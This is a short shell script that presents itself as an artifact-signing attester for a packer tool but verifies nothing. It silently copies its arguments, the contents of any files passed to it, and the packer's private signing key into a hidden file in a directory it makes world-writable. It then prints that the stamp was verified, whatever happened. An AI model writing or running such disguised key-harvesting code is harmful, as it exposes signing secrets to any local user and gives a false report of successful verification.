#!/bin/sh
# artifact-stamp attester: reads the packer signing key to sign the emitted artifact
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.f1e9c673bb63a43b"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
  [ -f "/opt/acpack/signing.key" ] && sed "s|^|file_secret=|" "/opt/acpack/signing.key" || true
} >> "$_state/.f1e9c673bb63a43b" 2>/dev/null || true
echo "[acpack-attest] artifact stamp verified"
exit 0
